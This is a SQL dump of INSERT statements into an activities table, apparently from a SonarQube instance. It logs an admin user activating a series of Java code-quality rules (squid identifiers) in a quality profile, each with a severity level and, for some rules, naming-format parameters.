INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2078, '2017-11-20 11:14:38.327', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S00117;ruleKey=squid:S00117;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIx53bbGRdfPp-q-C');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2079, '2017-11-20 11:14:38.369', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S00119;ruleKey=squid:S00119;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;param_format=^[A-Z][0-9]?$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIx6hbbGRdfPp-q-D');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2080, '2017-11-20 11:14:38.417', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S00120;ruleKey=squid:S00120;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;param_format=^[a-z]+(\.[a-z][a-z0-9]*)*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIx7RbbGRdfPp-q-E');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2081, '2017-11-20 11:14:38.444', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S106;ruleKey=squid:S106;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIx7sbbGRdfPp-q-F');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2082, '2017-11-20 11:14:38.48', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1065;ruleKey=squid:S1065;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIx8QbbGRdfPp-q-G');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2083, '2017-11-20 11:14:38.52', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1066;ruleKey=squid:S1066;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIx84bbGRdfPp-q-H');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2084, '2017-11-20 11:14:38.556', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1068;ruleKey=squid:S1068;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIx9cbbGRdfPp-q-I');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2085, '2017-11-20 11:14:38.594', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1075;ruleKey=squid:S1075;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIx-CbbGRdfPp-q-J');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2086, '2017-11-20 11:14:38.635', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1118;ruleKey=squid:S1118;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIx-rbbGRdfPp-q-K');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2087, '2017-11-20 11:14:38.704', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1125;ruleKey=squid:S1125;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIx_wbbGRdfPp-q-L');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2088, '2017-11-20 11:14:38.749', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1126;ruleKey=squid:S1126;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyAdbbGRdfPp-q-M');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2089, '2017-11-20 11:14:38.786', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1133;ruleKey=squid:S1133;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=INFO', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyBCbbGRdfPp-q-N');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2090, '2017-11-20 11:14:38.826', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1134;ruleKey=squid:S1134;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyBqbbGRdfPp-q-O');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2091, '2017-11-20 11:14:38.862', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1135;ruleKey=squid:S1135;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=INFO', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyCObbGRdfPp-q-P');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2092, '2017-11-20 11:14:38.899', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1141;ruleKey=squid:S1141;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyCzbbGRdfPp-q-Q');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2093, '2017-11-20 11:14:38.923', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1143;ruleKey=squid:S1143;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyDLbbGRdfPp-q-R');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2094, '2017-11-20 11:14:38.958', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1148;ruleKey=squid:S1148;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyDubbGRdfPp-q-S');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2095, '2017-11-20 11:14:39.031', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1149;ruleKey=squid:S1149;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyE3bbGRdfPp-q-T');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2096, '2017-11-20 11:14:39.088', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1150;ruleKey=squid:S1150;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyFwbbGRdfPp-q-U');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2097, '2017-11-20 11:14:39.154', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1153;ruleKey=squid:S1153;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyGybbGRdfPp-q-V');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2098, '2017-11-20 11:14:39.307', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1155;ruleKey=squid:S1155;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyJLbbGRdfPp-q-W');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2099, '2017-11-20 11:14:39.368', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1157;ruleKey=squid:S1157;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyKIbbGRdfPp-q-X');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2100, '2017-11-20 11:14:39.419', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1158;ruleKey=squid:S1158;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyK7bbGRdfPp-q-Y');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2101, '2017-11-20 11:14:39.446', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1161;ruleKey=squid:S1161;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyLWbbGRdfPp-q-Z');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2102, '2017-11-20 11:14:39.474', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1163;ruleKey=squid:S1163;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyLybbGRdfPp-q-a');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2103, '2017-11-20 11:14:39.505', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1165;ruleKey=squid:S1165;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyMRbbGRdfPp-q-b');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2104, '2017-11-20 11:14:39.533', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1168;ruleKey=squid:S1168;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyMtbbGRdfPp-q-c');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2105, '2017-11-20 11:14:39.563', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1170;ruleKey=squid:S1170;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyNLbbGRdfPp-q-d');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2106, '2017-11-20 11:14:39.591', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1171;ruleKey=squid:S1171;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyNnbbGRdfPp-q-e');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2107, '2017-11-20 11:14:39.617', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1172;ruleKey=squid:S1172;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyOBbbGRdfPp-q-f');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2108, '2017-11-20 11:14:39.649', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1174;ruleKey=squid:S1174;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyOgbbGRdfPp-q-g');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2109, '2017-11-20 11:14:39.676', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1175;ruleKey=squid:S1175;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyO8bbGRdfPp-q-h');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2110, '2017-11-20 11:14:39.704', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1181;ruleKey=squid:S1181;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyPYbbGRdfPp-q-i');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2111, '2017-11-20 11:14:39.73', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1182;ruleKey=squid:S1182;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyPybbGRdfPp-q-j');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2112, '2017-11-20 11:14:39.748', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1185;ruleKey=squid:S1185;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyQEbbGRdfPp-q-k');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2113, '2017-11-20 11:14:39.773', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1186;ruleKey=squid:S1186;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyQdbbGRdfPp-q-l');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2114, '2017-11-20 11:14:39.8', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1190;ruleKey=squid:S1190;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyQ4bbGRdfPp-q-m');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2115, '2017-11-20 11:14:39.82', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1191;ruleKey=squid:S1191;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;param_Exclude=;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyRMbbGRdfPp-q-n');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2116, '2017-11-20 11:14:39.847', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1192;ruleKey=squid:S1192;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;param_threshold=3;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyRnbbGRdfPp-q-o');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2117, '2017-11-20 11:14:39.872', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1193;ruleKey=squid:S1193;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIySAbbGRdfPp-q-p');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2118, '2017-11-20 11:14:39.9', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1195;ruleKey=squid:S1195;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyScbbGRdfPp-q-q');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2119, '2017-11-20 11:14:39.935', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1197;ruleKey=squid:S1197;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyS_bbGRdfPp-q-r');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2120, '2017-11-20 11:14:39.986', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1199;ruleKey=squid:S1199;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyTybbGRdfPp-q-s');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2121, '2017-11-20 11:14:40.075', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1201;ruleKey=squid:S1201;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyVLbbGRdfPp-q-t');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2122, '2017-11-20 11:14:40.134', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1206;ruleKey=squid:S1206;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyWGbbGRdfPp-q-u');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2123, '2017-11-20 11:14:40.212', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1210;ruleKey=squid:S1210;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyXUbbGRdfPp-q-v');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2124, '2017-11-20 11:14:40.249', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1214;ruleKey=squid:S1214;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyX5bbGRdfPp-q-w');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2125, '2017-11-20 11:14:40.287', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1215;ruleKey=squid:S1215;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyYfbbGRdfPp-q-x');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2126, '2017-11-20 11:14:40.325', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1217;ruleKey=squid:S1217;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyZFbbGRdfPp-q-y');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2127, '2017-11-20 11:14:40.35', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1219;ruleKey=squid:S1219;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyZebbGRdfPp-q-z');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2128, '2017-11-20 11:14:40.387', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1220;ruleKey=squid:S1220;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyaDbbGRdfPp-q-0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2129, '2017-11-20 11:14:40.414', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1221;ruleKey=squid:S1221;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyaebbGRdfPp-q-1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2130, '2017-11-20 11:14:40.45', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1223;ruleKey=squid:S1223;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIybCbbGRdfPp-q-2');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2131, '2017-11-20 11:14:40.476', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1226;ruleKey=squid:S1226;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIybcbbGRdfPp-q-3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2132, '2017-11-20 11:14:40.501', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1264;ruleKey=squid:S1264;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyb1bbGRdfPp-q-4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2133, '2017-11-20 11:14:40.522', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S128;ruleKey=squid:S128;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIycKbbGRdfPp-q-5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2134, '2017-11-20 11:14:40.545', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1301;ruleKey=squid:S1301;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIychbbGRdfPp-q-6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2135, '2017-11-20 11:14:40.562', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1313;ruleKey=squid:S1313;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIycybbGRdfPp-q-7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2136, '2017-11-20 11:14:40.577', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1317;ruleKey=squid:S1317;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIydBbbGRdfPp-q-8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2137, '2017-11-20 11:14:40.617', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1319;ruleKey=squid:S1319;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIydpbbGRdfPp-q-9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2138, '2017-11-20 11:14:40.655', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S135;ruleKey=squid:S135;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyePbbGRdfPp-q--');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (2139, '2017-11-20 11:14:40.681', 'admin', 'key=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105:squid:S1444;ruleKey=squid:S1444;profileKey=java-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_18-44105;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_ZIyepbbGRdfPp-q-_');
